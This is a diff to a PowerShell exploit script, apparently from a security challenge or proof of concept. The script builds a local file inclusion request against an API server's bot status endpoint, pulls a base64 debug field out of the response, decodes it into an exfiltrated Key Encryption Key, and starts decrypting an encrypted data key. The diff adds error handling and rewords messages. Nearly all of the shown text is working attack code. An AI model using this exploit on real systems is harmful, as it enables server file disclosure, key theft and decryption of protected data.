@@ -186,16 +186,21 @@ $url += "/$BotUUID/status?digest=00000000000000000000000000000000&debug=true"
 "`n"
 "Attempting to read $file off the API server..."
 # print the whole url out for reference or input to browser
-"LFI URI string used:`n" + $url
+"LFI URI built:`n" + $url
 
 # send the url and grab the response content
-$resp = (Invoke-WebRequest -SkipHttpErrorCheck -Uri $url).Content
+$resp = Invoke-WebRequest -SkipHttpErrorCheck -Uri $url
 
-$debugDataB64 = $($resp | select-string -pattern "debugData = `"(.+)`"" | %{ $_.Matches[0].Groups[1].Value })
+if($resp.StatusCode -ne 200){
+    "Bad request: $resp"
+    return
+}
+
+$debugDataB64 = $($resp.Content | select-string -pattern "debugData = `"(.+)`"" | %{ $_.Matches[0].Groups[1].Value })
 
 $KeyEncKey = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($debugDataB64))
 "`n"
-"RSA Key Encryption Key exfiltrated from API server:`n" + $KeyEncKey
+"Key Encryption Key exfiltrated from API server:`n" + $KeyEncKey
 
 "Attempting to decrypt the encrypted data encryption key..."
 # Strip the "BEGIN" and "END" lines and base64 decode the key content
